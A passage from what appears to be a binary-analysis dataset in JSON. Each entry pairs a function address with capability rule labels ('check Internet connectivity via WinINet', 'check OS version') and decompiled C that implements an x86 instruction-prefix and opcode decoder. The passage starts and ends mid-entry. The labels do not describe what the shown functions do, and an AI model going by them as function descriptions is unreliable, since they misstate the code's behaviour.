        "decompiled_code": "\nint32_t fcn.0005234c(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    \n    if (arg2 - 0x26U < 8) {\n        uVar1 = (*(arg1 + 0x129) & 1) << 3 | arg2 - 0x26U;\n    }\n    else {\n        uVar1 = arg2 - 0x1e;\n    }\n    if (*(arg1 + 0x133) == '\\x10') {\n        return uVar1 + 0x15;\n    }\n    if ((*(arg1 + 0xac) != ' ') &&\n       (((*(arg1 + 0x133) != ' ' || ((*(arg1 + 0x129) & 8) != 0)) || (*(arg1 + 0x132) != '\\0')))) {\n        return uVar1 + 0x35;\n    }\n    return uVar1 + 0x25;\n}\n",
        "token_count": 222
    },
    "0005247c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005247c(code **arg1)\n\n{\n    uint8_t uVar1;\n    uint64_t in_RAX;\n    uint64_t uVar2;\n    \n    uVar2 = in_RAX & 0xffffffffffffff00;\n    if (*(arg1 + 1) == *(arg1 + 9)) {\n        if (*(arg1 + 6) == '\\0') {\n            uVar2 = (**arg1)();\n            if (uVar2 != -1) {\n                *(arg1 + 9) = *(arg1 + 9) + '\\x01';\n                *(arg1 + 1) = *(arg1 + 9);\n                *(*(arg1 + 9) + 0x13a + arg1) = uVar2;\n                goto code_r0x000524be;\n            }\n        }\n        *(arg1 + 0x25) = 1;\n        *(arg1 + 6) = 1;\n        uVar2 = uVar2 & 0xffffffffffffff00;\n    }\n    else {\n        uVar1 = *(arg1 + 1) + 1;\n        *(arg1 + 1) = uVar1;\n        uVar2 = *(uVar1 + 0x13a + arg1);\ncode_r0x000524be:\n        *(*(arg1 + 3) + 0x23a + arg1) = uVar2;\n        *(arg1 + 3) = *(arg1 + 3) + '\\x01';\n    }\n    return uVar2;\n}\n",
        "token_count": 340
    },
    "000527a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000527a4(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    piVar1 = *(*(arg1 + 8) + 0x13a + arg1) * 0x20 + 0x6b980;\n    *(arg1 + 0xb8) = piVar1;\n    if (*(*(arg1 + 8) + 0x13a + arg1) == -0x70) {\n        if ((*(arg1 + 0xac) == '@') && ((*(arg1 + 0x129) & 1) != 0)) {\n            return;\n        }\n        if (*(arg1 + 0x12e) != '\\0') {\n            *(arg1 + 0x12e) = 0;\n            *(arg1 + 0xb8) = 0x7d120;\n            return;\n        }\n        uVar3 = 0x7d100;\n    }\n    else {\n        if ((*(arg1 + 0xac) != '@') || (*piVar1 != 0xf)) {\n            if (*piVar1 == 0x216) {\n                uVar2 = fcn.000524e4(arg1);\n                iVar4 = (uVar2 >> 3 & 7) * 0x20 + *(*(*(arg1 + 0xb8) + 0x1c) * 0x20 + 0x783e0);\n            }\n            else {\n                if (*piVar1 != 0x21f) {\n                    return;\n                }\n                uVar2 = fcn.000524e4(arg1);\n                if (0xbf < uVar2) {\n                    uVar2 = fcn.000524e4(arg1);\n                    *(arg1 + 0xb8) = (uVar2 - 0xc0) * 0x20 + *(*(*(arg1 + 8) + 0x13a + arg1) * 8 + 0x7c9e0);\n                    fcn.0005247c(arg1);\n                    return;\n                }\n                uVar2 = fcn.000524e4(arg1);\n                iVar4 = (uVar2 >> 3 & 7) * 0x20 + *(*(*(arg1 + 8) + 0x13a + arg1) * 8 + 0x7c9a0);\n            }\n            *(arg1 + 0xb8) = iVar4;\n            return;\n        }\n        uVar3 = 0x7d140;\n    }\n    *(arg1 + 0xb8) = uVar3;\n    return;\n}\n",
        "token_count": 600
    },
    "00052904": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00052904(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint8_t uVar7;\n    \n    fcn.0005247c(arg1);\n    cVar2 = *(arg1 + 0x131);\n    if (cVar2 == 'f') {\n        piVar1 = *(*(arg1 + 8) + 0x13a + arg1) * 0x20 + 0x71980;\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 299) = 0;\n        }\n    }\n    else if (cVar2 == -0xe) {\n        piVar1 = *(*(arg1 + 8) + 0x13a + arg1) * 0x20 + 0x73980;\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 0x130) = 0;\n        }\n    }\n    else if (cVar2 == -0xd) {\n        piVar1 = *(*(arg1 + 8) + 0x13a + arg1) * 0x20 + 0x6f980;\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 0x12e) = 0;\n        }\n    }\n    if ((*(arg1 + 0xb8) == NULL) || (**(arg1 + 0xb8) == 0x244)) {\n        *(arg1 + 0xb8) = *(*(arg1 + 8) + 0x13a + arg1) * 0x20 + 0x6d980;\n    }\n    if (**(arg1 + 0xb8) == 0x220) {\n        *(arg1 + 0xb8) = 0x7d0e0;\n    }\n    if (**(arg1 + 0xb8) != 0x216) {\n        return;\n    }\n    uVar6 = (*(arg1 + 0xb8))[7];\n    if ((cVar2 == 'f') && (*(uVar6 * 0x20 + 0x783e8) != 0)) {\n        uVar3 = fcn.000524e4(arg1);\n        piVar1 = (uVar3 >> 3 & 7) * 0x20 + *(uVar6 * 0x20 + 0x783e8);\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 299) = 0;\n            return;\n        }\n    }\n    else if ((cVar2 == -0xe) && (*(uVar6 * 0x20 + 0x783f0) != 0)) {\n        uVar3 = fcn.000524e4(arg1);\n        piVar1 = (uVar3 >> 3 & 7) * 0x20 + *(uVar6 * 0x20 + 0x783f0);\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 0x130) = 0;\n            return;\n        }\n    }\n    else if ((cVar2 == -0xd) && (*(uVar6 * 0x20 + 0x783f8) != 0)) {\n        uVar3 = fcn.000524e4(arg1);\n        piVar1 = (uVar3 >> 3 & 7) * 0x20 + *(uVar6 * 0x20 + 0x783f8);\n        *(arg1 + 0xb8) = piVar1;\n        if ((piVar1 != NULL) && (*piVar1 != 0x244)) {\n            *(arg1 + 0x12e) = 0;\n            return;\n        }\n    }\n    if ((*(arg1 + 0x131) == '\\0') || (**(arg1 + 0xb8) == 0x216)) {\n        uVar3 = fcn.000524e4(arg1);\n        *(arg1 + 0xb8) = (uVar3 >> 3 & 7) * 0x20 + *(uVar6 * 0x20 + 0x783e0);\n    }\n    cVar2 = *(*(arg1 + 8) + 0x13a + arg1);\n    if (cVar2 != '\\x01') {\n        if (cVar2 != -0x52) {\n            return;\n        }\n        uVar3 = fcn.000524e4(arg1);\n        uVar7 = uVar3 >> 3 & 7;\n        uVar3 = fcn.000524e4(arg1);\n        uVar3 = uVar3 >> 6;\n        if (uVar7 == 5) {\n            if (uVar3 == 3) {\n                iVar5 = 0x78180;\n                goto code_r0x00052c57;\n            }\n        }\n        else if (uVar7 == 6) {\n            if (uVar3 == 3) {\n                iVar5 = 0x781a0;\n                goto code_r0x00052c57;\n            }\n        }\n        else if ((uVar7 == 7) && (uVar3 == 3)) {\n            iVar5 = 0x781c0;\n            goto code_r0x00052c57;\n        }\n        iVar5 = 0x77d80;\n        goto code_r0x00052c6f;\n    }\n    uVar3 = fcn.000524e4(arg1);\n    uVar7 = uVar3 >> 3 & 7;\n    uVar3 = fcn.000524e4(arg1);\n    uVar4 = fcn.000524e4(arg1);\n    if (uVar7 == 3) {\n        if (uVar3 >> 6 != 3) {\ncode_r0x00052bf4:\n            iVar5 = 0x76980;\ncode_r0x00052c6f:\n            *(arg1 + 0xb8) = uVar7 * 0x20 + iVar5;\n            return;\n        }\n        iVar5 = 0x76b80;\n    }\n    else {\n        if ((uVar7 != 7) || (uVar3 >> 6 != 3)) goto code_r0x00052bf4;\n        iVar5 = 0x76a80;\n    }\n    iVar5 = (uVar4 & 7) * 0x20 + iVar5;\ncode_r0x00052c57:\n    *(arg1 + 0xb8) = iVar5;\n    fcn.0005247c(arg1);\n    return;\n}\n",
        "token_count": 1626
    },
    "00053224": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00053224(int64_t arg1, ulong noname_1, uint *arg3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uchar uVar4;\n    uint16_t uVar5;\n    ushort uVar6;\n    uint uVar7;\n    int64_t iVar8;\n    int32_t iVar9;\n    uint64_t uVar10;\n    uint *arg2;\n    uint64_t arg2_00;\n    int64_t arg3_00;\n    uint64_t arg3_01;\n    \n    iVar8 = *(arg1 + 0xb8);\n    uVar1 = *(iVar8 + 4);\n    uVar2 = *(iVar8 + 0xc);\n    iVar9 = *(iVar8 + 0x14);\n    arg3_01 = *(iVar8 + 8);\n    arg2_00 = *(iVar8 + 0x10);\n    uVar10 = *(iVar8 + 0x18);\n    arg2 = arg1 + 200;\n    iVar8 = arg1;\n    if (0x44 < uVar1) {\n        if (uVar1 < 0x4d) {\n            if (uVar1 == 0x4c) {\n                if (uVar2 != 0x4b) {\n                    if (uVar2 == 0x4a) {\ncode_r0x000533c7:\n                        arg2 = arg1 + 0xe8;\n                        arg3_01 = arg2_00;\n                        goto code_r0x00053978;\n                    }\n                    if (uVar2 != 2) {\n                        return;\n                    }\n                }\ncode_r0x00053888:\n                fcn.00052d38(arg1, arg1 + 0xe8, arg2_00);\n                if (iVar9 != 5) {\n                    return;\n                }\ncode_r0x000538ab:\n                arg3_00 = arg1 + 0x108;\n                goto code_r0x000534ea;\n            }\n            if (uVar1 != 0x45) {\n                if (uVar1 == 0x46) {\n                    fcn.000531b8(arg1, arg3_01, arg2);\n                    *(arg1 + 0xe8) = 0x8c;\n                    uVar4 = fcn.00052258(arg1, arg3_01);\n                    *(arg1 + 0xec) = uVar4;\n                    if (uVar2 == 6) {\n                        *(arg1 + 0xf8) = 1;\n                        return;\n                    }\n                    if (uVar2 == 0x2e) goto code_r0x0005333a;\n                    uVar10 = 0x1e;\n                    if (uVar2 != 0x1e) {\n                        return;\n                    }\n                    goto code_r0x00053845;\n                }\n                if (uVar1 == 0x48) {\n                    *arg2 = 0x91;\n                    *(arg1 + 0xd0) = 3;\n                    return;\n                }\n                if (uVar1 != 0x49) {\n                    if ((uVar1 != 0x4a) && (uVar1 != 0x4b)) goto code_r0x000538d4;\n                    goto code_r0x00053978;\n                }\n                if (uVar2 == 0x4a) {\n                    uVar3 = fcn.000524e4(arg1);\n                    if ((uVar3 & 0xc0) == 0xc0) {\n                        if (*(arg1 + 0xc0) == 0x124) {\n                            *(arg1 + 0xc0) = 0x11f;\n                        }\n                        else if (*(arg1 + 0xc0) == 0x121) {\n                            *(arg1 + 0xc0) = 0x122;\n                        }\n                    }\n                    goto code_r0x00053888;\n                }\n                if (uVar2 == 0x4b) goto code_r0x000533c7;\n                if (uVar2 == 3) {\n                    uVar3 = fcn.000524e4(arg1);\n                    if ((uVar3 & 0xc0) == 0xc0) {\n                        *(arg1 + 0x128) = 1;\n                    }\n                }\n                else if (uVar2 != 2) {\n                    return;\n                }\n            }\n        }\n        else {\n            if (uVar1 == 0x4d) {\n                if ((uVar2 != 0x4e) && (uVar2 != 0x4f)) {\n                    return;\n                }\n                goto code_r0x00053978;\n            }\n            if ((uVar1 != 0x4e) && (uVar1 != 0x4f)) {\n                if (uVar1 == 0x50) {\n                    uVar3 = fcn.000524e4(arg1);\n                    if ((uVar3 & 0xc0) != 0xc0) {\n                        *(arg1 + 0x128) = 1;\n                    }\n                }\n                else {\n                    if (uVar1 != 0x51) goto code_r0x000538d4;\n                    uVar3 = fcn.000524e4(arg1);\n                    if ((uVar3 & 0xc0) != 0xc0) {\n                        *(arg1 + 0x128) = 1;\n                    }\n                }\n                fcn.00052d38(arg1, arg2, arg3_01);\n                goto code_r0x000534d8;\n            }\n        }\ncode_r0x00053371:\n        arg2 = arg1 + 0xe8;\n        arg3_01 = arg2_00;\ncode_r0x00053978:\n        fcn.00052d38(arg1, arg2, arg3_01);\n        return;\n    }\n    if (uVar1 == 0x44) {\n        fcn.00052cd4(arg1, arg3_01, arg2);\n        *arg2 = 0x90;\n        return;\n    }\n    if (uVar1 < 0x16) {\n        if (0xd < uVar1) {\n            iVar9 = (uVar1 - 0xd) + (*(arg1 + 0x129) & 1) * 8;\n            if ((4 < iVar9) && (*(arg1 + 0x129) != 0)) {\n                iVar9 = iVar9 + 4;\n            }\n            *arg2 = 0x8c;\n            *(arg1 + 0xd8) = iVar9;\n            goto code_r0x000534d8;\n        }\n        if (uVar1 == 1) {\n            *arg2 = 0x8e;\n            if (*(arg1 + 0x133) == '\\x10') {\n                *(arg1 + 0xcc) = 0x20;\n                uVar5 = fcn.0005250c(arg1);\n                *(arg1 + 0xd4) = uVar5;\n            }\n            else {\n                *(arg1 + 0xcc) = 0x30;\n                uVar7 = fcn.00052538(arg1);\n                *(arg1 + 0xd4) = uVar7;\n            }\n            uVar6 = fcn.0005250c(arg1);\n            *(arg1 + 0xd0) = uVar6;\n            return;\n        }\n        if (uVar1 == 2) {\ncode_r0x000533fd:\n            if (uVar2 == 4) {\n                fcn.00052d38(arg1, arg2, arg3_01);\n                if (iVar9 != 5) {\n                    if (iVar9 != 7) {\n                        return;\n                    }\n                    *(arg1 + 0x108) = 0x8c;\n                    *(arg1 + 0x118) = 2;\n                    *(arg1 + 0x10c) = 8;\n                    return;\n                }\n                goto code_r0x000538ab;\n            }\n            if (((uVar2 == 0x4c) || (uVar2 == 0x49)) || (uVar2 == 0x45)) goto code_r0x00053978;\n            fcn.00052d38(arg1, arg2, arg3_01);\n            if (uVar2 == 7) {\n                *(arg1 + 0xf8) = 2;\ncode_r0x0005361f:\n                *(arg1 + 0xe8) = 0x8c;\n                *(arg1 + 0xec) = 8;\n                return;\n            }\n            if (uVar2 == 0x47) {\n                *(arg1 + 0xe8) = 0x91;\n                *(arg1 + 0xf0) = 1;\n                return;\n            }\n            goto code_r0x000534d8;\n        }\n        if (uVar1 == 3) {\n            uVar3 = fcn.000524e4(arg1);\n            if ((uVar3 & 0xc0) == 0xc0) {\n                *(arg1 + 0x128) = 1;\n            }\n            goto code_r0x000533fd;\n        }\n        if (uVar1 == 4) {\n            if (uVar2 != 3) {\n                if ((uVar2 != 2) && (uVar2 != 0x51)) {\n                    if (uVar2 == 0x50) {\n                        uVar3 = fcn.000524e4(arg1);\n                        if ((uVar3 & 0xc0) != 0xc0) {\n                            *(arg1 + 0x128) = 1;\n                        }\n                    }\n                    else if (uVar2 != 0x4a) {\n                        return;\n                    }\n                    goto code_r0x000533c7;\n                }\n                goto code_r0x00053888;\n            }\n            uVar3 = fcn.000524e4(arg1);\n            if ((uVar3 & 0xc0) == 0xc0) {\n                *(arg1 + 0x128) = 1;\n            }\n            goto code_r0x00053371;\n        }\n        if (uVar1 == 5) {\n            fcn.00052cd4(arg1, arg3_01, arg2);\n            if (uVar2 != 5) {\n                if (uVar2 == 6) {\ncode_r0x000532db:\n                    *(arg1 + 0xe8) = 0x8c;\n                    *(arg1 + 0xf8) = 0x17;\n                    *(arg1 + 0xec) = 0x10;\n                    return;\n                }\n                if (uVar2 != 0x2e) {\n                    return;\n                }\n                goto code_r0x00053333;\n            }\n        }\n        else {\n            if ((uVar1 < 6) || (0xd < uVar1)) goto code_r0x000538d4;\n            *arg2 = 0x8c;\n            *(arg1 + 0xd8) = uVar1 - 5;\n            *(arg1 + 0xcc) = 8;\n            if (uVar2 != 5) {\n                if (uVar2 != 0x18) {\n                    if (uVar2 != 0x46) {\n                        return;\n                    }\n                    fcn.000531b8(arg1, arg2_00, arg1 + 0xe8);\n                    return;\n                }\n                goto code_r0x000532db;\n            }\n        }\n    }\n    else {\n        if (0x35 < uVar1) {\n            if (0x35 < uVar1) {\n                if (uVar1 < 0x3c) {\n                    if (((*(arg1 + 0xac) == '@') && (uVar1 != 0x3a)) && (uVar1 != 0x3b)) {\n                        *(arg1 + 0x128) = 1;\n                    }\n                    *(arg1 + 0xd8) = uVar1 + 0xf;\n                    goto code_r0x000536c9;\n                }\n                if (uVar1 < 0x44) {\n                    *arg2 = 0x8c;\n                    *(arg1 + 0xd8) = uVar1 + 0x37;\n                    *(arg1 + 0xcc) = 0;\n                    if (7 < uVar2 - 0x3c) {\n                        return;\n                    }\n                    *(arg1 + 0xe8) = 0x8c;\n                    *(arg1 + 0xec) = 0;\n                    *(arg1 + 0xf8) = uVar2 + 0x37;\n                    return;\n                }\n            }\ncode_r0x000538d4:\n            *(arg1 + 0x108) = 0;\n            *(arg1 + 0xe8) = 0;\n            *arg2 = 0;\n            return;\n        }\n        if (uVar1 < 0x2e) {\n            if (uVar1 == 0x16) {\n                *(arg1 + 0xd8) = 0x15;\ncode_r0x000536c9:\n                *arg2 = 0x8c;\n                *(arg1 + 0xcc) = 0x10;\n                return;\n            }\n            if (uVar1 == 0x18) {\n                *arg2 = 0x8c;\n                *(arg1 + 0xd8) = 0x17;\n                *(arg1 + 0xcc) = 0x10;\n                if (uVar2 != 0x2e) {\n                    if (uVar2 != 6) {\n                        return;\n                    }\n                    *(arg1 + 0xf8) = 1;\n                    goto code_r0x0005361f;\n                }\ncode_r0x00053333:\n                *(arg1 + 0xe8) = 0x8c;\ncode_r0x0005333a:\n                uVar7 = 0x25;\n                if (*(arg1 + 0x133) == '\\x10') {\n                    uVar7 = 0x15;\n                }\n                goto code_r0x0005334a;\n            }\n            if ((uVar1 < 0x1e) || (0x2d < uVar1)) goto code_r0x000538d4;\n            *arg2 = 0x8c;\n            uVar7 = fcn.0005234c(arg1, uVar1, arg3);\n            *(arg1 + 0xd8) = uVar7;\n            if (uVar2 == 5) {\n                arg3_00 = arg1 + 0xe8;\n                arg1 = iVar8;\n                uVar10 = arg2_00;\n                goto code_r0x000534ea;\n            }\n            if (7 < uVar2 - 0x1e) {\n                if (uVar2 != 0x46) {\n                    return;\n                }\n                fcn.000531b8(iVar8, arg2_00, arg1 + 0xe8);\n                uVar4 = fcn.00052258(arg1, arg2_00);\n                *(arg1 + 0xcc) = uVar4;\n                return;\n            }\n            *(arg1 + 0xe8) = 0x8c;\n            uVar10 = uVar2;\n            arg2 = arg3;\ncode_r0x00053845:\n            uVar7 = fcn.0005234c(iVar8, uVar10, arg2);\ncode_r0x0005334a:\n            *(arg1 + 0xf8) = uVar7;\n            return;\n        }\n        *arg2 = 0x8c;\n        if (*(arg1 + 0x133) == '\\x10') {\n            iVar9 = uVar1 - 0x19;\n        }\n        else {\n            iVar9 = uVar1 - 9;\n        }\n        *(arg1 + 0xd8) = iVar9;\n        if (uVar2 == 0x18) goto code_r0x000532db;\ncode_r0x000534d8:\n        if (uVar2 != 5) {\n            return;\n        }\n    }\n    arg3_00 = arg1 + 0xe8;\n    uVar10 = arg2_00;\ncode_r0x000534ea:\n    fcn.00052cd4(arg1, uVar10, arg3_00);\n    return;\n}\n",
        "token_count": 3681
    },
    "00053994": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00053994(uint64_t arg1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    ulong in_RDX;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint uVar9;\n    uchar *puVar10;\n    ulong in_R8;\n    uint32_t uVar11;\n    \n    uVar7 = 0;\n    *(arg1 + 0x18) = 0;\n    fcn.000523a8(arg1);\n    fcn.0005247c(arg1);\n    uVar11 = 0;\n    bVar3 = false;\n    uVar9 = 0x36;\n    do {\n        uVar1 = *(*(arg1 + 8) + 0x13a + arg1);\n        if ((uVar1 & 0xf0) == 0x40) {\n            if (*(arg1 + 0xac) == '@') {\n                *(arg1 + 0x129) = uVar1;\n                goto code_r0x00053aab;\n            }\ncode_r0x000539e3:\n            bVar3 = true;\n        }\n        else {\n            if (uVar1 < 0x66) {\n                if (uVar1 == 0x65) {\n                    *(arg1 + 0x12a) = 0x4a;\n                }\n                else if (uVar1 == 0x26) {\n                    *(arg1 + 0x12a) = 0x45;\n                }\n                else if (uVar1 == 0x2e) {\n                    *(arg1 + 0x12a) = 0x46;\n                }\n                else if (uVar1 == 0x36) {\n                    *(arg1 + 0x12a) = 0x47;\n                }\n                else if (uVar1 == 0x3e) {\n                    *(arg1 + 0x12a) = 0x48;\n                }\n                else {\n                    if (uVar1 != 100) goto code_r0x000539e3;\n                    *(arg1 + 0x12a) = 0x49;\n                }\n            }\n            else if (uVar1 == 0x66) {\n                *(arg1 + 299) = 0x66;\n                *(arg1 + 0x131) = 0x66;\n            }\n            else if (uVar1 == 0x67) {\n                *(arg1 + 300) = 0x67;\n            }\n            else if (uVar1 == 0xf0) {\n                *(arg1 + 0x12d) = 0xf0;\n            }\n            else if (uVar1 == 0xf2) {\n                *(arg1 + 0x130) = 0xf2;\n                *(arg1 + 0x131) = 0xf2;\n            }\n            else {\n                if (uVar1 != 0xf3) goto code_r0x000539e3;\n                *(arg1 + 0x12e) = 0xf3;\n                *(arg1 + 0x131) = 0xf3;\n            }\ncode_r0x00053aab:\n            fcn.0005247c(arg1);\n        }\n        if (0xe < uVar11) {\n            *(arg1 + 0x128) = 1;\n            break;\n        }\n        uVar11 = uVar11 + 1;\n    } while (!bVar3);\n    if (*(arg1 + 0x18) != '\\0') {\n        *(arg1 + 8) = *(arg1 + 8) + -1;\n        *(arg1 + 0x18) = *(arg1 + 0x18) + -1;\n    }\n    fcn.00052c90(arg1);\n    cVar4 = *(arg1 + 0xac);\n    if (cVar4 == '@') {\n        iVar8 = *(arg1 + 0xb8);\n        *(arg1 + 0x129) = *(arg1 + 0x129) & (*(iVar8 + 0x1e) & 0xf | 0x40);\n        *(arg1 + 0x132) = *(iVar8 + 0x1c) & 8;\n        *(arg1 + 0x128) = *(iVar8 + 0x1c) & 0x10;\n        if (((*(iVar8 + 0x1c) & 0xff0000) == 0) || ((*(arg1 + 0x129) & 8) == 0)) {\n            if (*(arg1 + 299) == '\\0') {\n                *(arg1 + 0x133) = (-(*(arg1 + 0x132) != '\\0') & 0x20U) + 0x20;\n            }\n            else {\n                *(arg1 + 0x133) = 0x10;\n            }\n        }\n        else {\n            *(arg1 + 0x133) = 0x40;\n        }\n        cVar4 = (-(*(arg1 + 300) != '\\0') & 0xe0U) + 0x40;\ncode_r0x00053bd5:\n        *(arg1 + 0x134) = cVar4;\n    }\n    else {\n        if (cVar4 == ' ') {\n            *(arg1 + 0x133) = (-(*(arg1 + 299) != '\\0') & 0xf0U) + 0x20;\n            cVar4 = (-(*(arg1 + 300) != '\\0') & 0xf0U) + 0x20;\n            goto code_r0x00053bd5;\n        }\n        if (cVar4 == '\\x10') {\n            *(arg1 + 0x133) = (-(*(arg1 + 299) != '\\0') & 0x10U) + 0x10;\n            cVar4 = (-(*(arg1 + 300) != '\\0') & 0x10U) + 0x10;\n            goto code_r0x00053bd5;\n        }\n    }\n    iVar8 = *(arg1 + 0xb8);\n    if (((*(iVar8 + 0x1c) & 4) == 0) && (*(arg1 + 299) != '\\0')) {\n        *(arg1 + 0x128) = 1;\n    }\n    if (((*(iVar8 + 0x1c) & 1) == 0) && (*(arg1 + 300) != '\\0')) {\n        *(arg1 + 0x128) = 1;\n    }\n    *(arg1 + 0x137) = *(iVar8 + 0x1c) >> 5 & 1;\n    *(arg1 + 0x138) = *(iVar8 + 0x1c) >> 6 & 1;\n    *(arg1 + 0x139) = *(iVar8 + 0x1c) >> 7 & 1;\n    uVar6 = arg1;\n    fcn.00053224(arg1, in_RDX, in_R8);\n    if ((*(*(arg1 + 0xb8) + 0x1c) >> 8 & 1) != 0) {\n        if (*(arg1 + 0x133) == ' ') {\n            uVar11 = *(arg1 + 0xc0);\n            if (uVar11 < 0x14b) {\n                if (uVar11 == 0x14a) {\ncode_r0x00053cd8:\n                    uVar6 = uVar11;\n                    uVar9 = 0x149;\n                }\n                else {\n                    uVar6 = uVar11 - 0x19;\n                    if (uVar11 - 0x19 == 0) {\n                        uVar9 = 0x5a;\n                    }\n                    else {\n                        uVar6 = uVar11 - 0x39;\n                        if (uVar11 - 0x39 != 0) {\n                            uVar6 = uVar11 - 0x59;\n                            if (uVar11 - 0x59 == 0) {\n                                uVar9 = 0x5b;\n                            }\n                            else {\n                                uVar6 = uVar11 - 0xd4;\n                                if (uVar11 - 0xd4 == 0) {\ncode_r0x00053cba:\n                                    uVar9 = 0xd3;\n                                }\n                                else {\n                                    uVar6 = uVar11 - 0xd9;\n                                    if (uVar11 - 0xd9 == 0) {\n                                        uVar9 = 0xda;\n                                    }\n                                    else {\n                                        uVar11 = uVar11 - 0x103;\n                                        uVar6 = uVar11;\n                                        if (uVar11 == 0) {\n                                            uVar9 = 0x101;\n                                        }\n                                        else {\n                                            if (uVar11 != 0x32) goto code_r0x00053d3f;\n                                            uVar9 = 0x132;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                uVar6 = uVar11 - 0x185;\n                if (uVar11 - 0x185 == 0) {\n                    uVar9 = 0x186;\n                }\n                else {\n                    uVar6 = uVar11 - 0x187;\n                    if (uVar11 - 0x187 == 0) {\n                        uVar9 = 0x188;\n                    }\n                    else {\n                        uVar6 = uVar11 - 0x1ae;\n                        if (uVar11 - 0x1ae == 0) {\n                            uVar9 = 0x1af;\n                        }\n                        else {\n                            uVar6 = uVar11 - 0x1b0;\n                            if (uVar11 - 0x1b0 == 0) {\n                                uVar9 = 0x1b1;\n                            }\n                            else {\n                                uVar11 = uVar11 - 0x1ce;\n                                uVar6 = uVar11;\n                                if (uVar11 == 0) {\n                                    uVar9 = 0x1cc;\n                                }\n                                else {\n                                    if (uVar11 != 0x26) goto code_r0x00053d3f;\n                                    uVar9 = 0x1f5;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        else {\ncode_r0x00053d3f:\n            if (*(arg1 + 0x133) == '@') {\n                uVar5 = *(arg1 + 0xc0);\n                uVar6 = uVar5;\n                if (uVar5 < 0x104) {\n                    if (uVar5 == 0x103) {\n                        uVar9 = 0x102;\n                    }\n                    else {\n                        uVar6 = uVar5 - 0x19;\n                        if (uVar5 - 0x19 == 0) {\n                            uVar9 = 0x1a;\n                        }\n                        else {\n                            uVar6 = uVar5 - 0x39;\n                            if (uVar5 - 0x39 == 0) {\n                                uVar9 = 0x37;\n                            }\n                            else {\n                                uVar6 = uVar5 - 0x3b;\n                                if (uVar5 - 0x3b == 0) {\n                                    uVar9 = 0x222;\n                                }\n                                else {\n                                    uVar6 = uVar5 - 0x59;\n                                    if (uVar5 - 0x59 == 0) {\n                                        uVar9 = 0x40;\n                                    }\n                                    else {\n                                        uVar5 = uVar5 - 0xd4;\n                                        uVar6 = uVar5;\n                                        if (uVar5 == 0) goto code_r0x00053cba;\n                                        if (uVar5 != 5) goto code_r0x00053dfa;\n                                        uVar9 = 0xdb;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    uVar6 = uVar5 - 0x135;\n                    if (uVar5 - 0x135 == 0) {\n                        uVar9 = 0x133;\n                    }\n                    else {\n                        uVar11 = uVar5 - 0x14a;\n                        if (uVar11 == 0) goto code_r0x00053cd8;\n                        uVar6 = uVar5 - 0x187;\n                        if (uVar5 - 0x187 == 0) {\n                            uVar9 = 0x189;\n                        }\n                        else {\n                            uVar6 = uVar5 - 0x1b0;\n                            if (uVar5 - 0x1b0 == 0) {\n                                uVar9 = 0x1b2;\n                            }\n                            else {\n                                uVar5 = uVar5 - 0x1ce;\n                                uVar6 = uVar5;\n                                if (uVar5 == 0) {\n                                    uVar9 = 0x1cd;\n                                }\n                                else {\n                                    if (uVar5 != 0x26) goto code_r0x00053dfa;\n                                    uVar9 = 0x223;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else {\ncode_r0x00053dfa:\n                uVar6 = 0;\n                if ((*(arg1 + 0x134) == ' ') && (*(arg1 + 0xc0) == 0xdc)) {\n                    uVar9 = 0xdd;\n                }\n                else if ((*(arg1 + 0x134) != '@') || (uVar9 = 0xdf,  *(arg1 + 0xc0) != 0xdc)) {\n                    uVar9 = *(arg1 + 0xc0);\n                }\n            }\n        }\n        *(arg1 + 0xc0) = uVar9;\n    }\n    iVar2 = *(arg1 + 0xc0);\n    *(arg1 + 0x135) = 0;\n    *(arg1 + 0x136) = 0;\n    if ((iVar2 == 